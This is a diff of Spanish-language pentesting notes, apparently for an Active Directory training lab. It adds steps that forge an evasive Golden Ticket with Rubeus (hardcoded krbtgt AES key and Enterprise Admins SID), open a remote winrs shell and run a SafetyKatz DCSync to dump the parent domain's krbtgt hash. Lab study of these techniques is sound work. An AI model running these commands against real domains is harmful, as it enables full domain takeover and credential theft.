@@ -21,18 +21,28 @@ Tags: #AD #Krbtgt
 ```
 
 ```powershell 
-! Usuario: Domain Admin del dominio hijo
+! Usuario: Usuario del dominio (Ya tener la clave del krbtgt)
 
-❯ .\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
-# Forjar un Golden Ticket evasivo del dominio hijo con SIDHistory de Enterprise Admins del padre — versión OPSEC-friendly del ataque de escalado entre dominios.
-# /sids   → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519)
-# /aes256 → clave AES256 de krbtgt del dominio hijo (más sigiloso que RC4)
-# /netbios → nombre NetBIOS del dominio hijo
-# /ptt    → inyectar el ticket directamente en la sesión actual
+Paso 1:
+# Ejecutar con cmd admin 
+# Forjar un Golden Ticket evasivo del dominio hijo con SIDHistory de Enterprise Admins del padre — versión OPSEC-friendly del ataque de escalado entre dominios
+❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
+	# /sids   → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519)
+	# /aes256 → clave AES256 de krbtgt del dominio hijo (más sigiloso que RC4) del DC 'dcorp'
+	# /netbios → nombre NetBIOS del dominio hijo
+	# /ptt    → inyectar el ticket directamente en la sesión actual
 
+Paso 2:
 ❯ winrs -r:mcorp-dc cmd
-# Abrir una shell remota en el equipo objetivo usando el ticket inyectado
+# Abrir una shell remota en el equipo objetivo usando el ticket inyectado 
 	❯ set username 
+	❯ set computername
+```
+
+```powershell 
+Paso 3: 
+# Hacer DCSync desde la consola con el ticket importado del paso 1 (No en la sesión del paso 2)
+❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
 ## Golden ticket con la identidad de maquina 
@@ -82,6 +92,3 @@ Tags: #AD #Krbtgt
 ❯ SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 # Ejecutar DCSync contra el dominio padre usando el ticket inyectado — volcar el hash de krbtgt del dominio padre para completar el escalado de bosque.
 ```
-
-
-![](Pasted%20image%2020260422173441.png)
